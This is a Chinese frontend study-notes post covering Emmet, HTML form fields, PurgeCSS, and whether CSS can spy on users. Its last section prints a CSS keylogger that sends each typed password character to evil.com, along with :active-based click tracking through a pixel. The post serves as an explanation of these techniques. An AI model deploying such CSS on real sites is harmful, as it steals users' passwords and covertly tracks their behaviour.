---
title: '毎日のフロントエンド 342~345'
date: 2022-06-27T20:47:23+09:00
description: frontend 每日一练
categories:
  - HTML
  - CSS
---

## HTML

### HTML 插件

- [Abbreviations Syntax](https://docs.emmet.io/abbreviations/syntax/)

### 什么是表单域

- `<form></form>`标签中间的部分
- 当点击这个表单域中的 `submit` 按钮，就会把表单中的数据提交到 action 的属性指定的 url

## CSS

### 除无用 css

- [PurgeCSS - Remove unused CSS | PurgeCSS](https://purgecss.com/)

### css 能否监控到用户信息

- Keylogging

```css
input[type='password'][value$='a'] {
  background-image: url('http://evil.com/api/a');
}

input[type='password'][value$='b'] {
  background-image: url('http://evil.com/api/b');
}

input[type='password'][value$='c'] {
  background-image: url('http://evil.com/api/c');
}
```

- 当用户输入密码时，这段 css 会请求用户输入的字符对应的资源，远端服务器通过监视请求资源的顺序从而推断用户的密码

---

- 利用`:active` 伪类实现监控用户的点击

```css
.button-1:active::after {
  content: url(./pixel.gif?action=click&id=button1);
  display: none;
}
.button-2:active::after {
  content: url(./pixel.gif?action=click&id=button2);
  display: none;
}
```

## Reference

- [fe-interview/history.md](https://github.com/haizlin/fe-interview/blob/master/category/history.md)

- [CSS-Keylogging/keylogger.css at master · maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging/blob/master/css-keylogger-extension/keylogger.css)
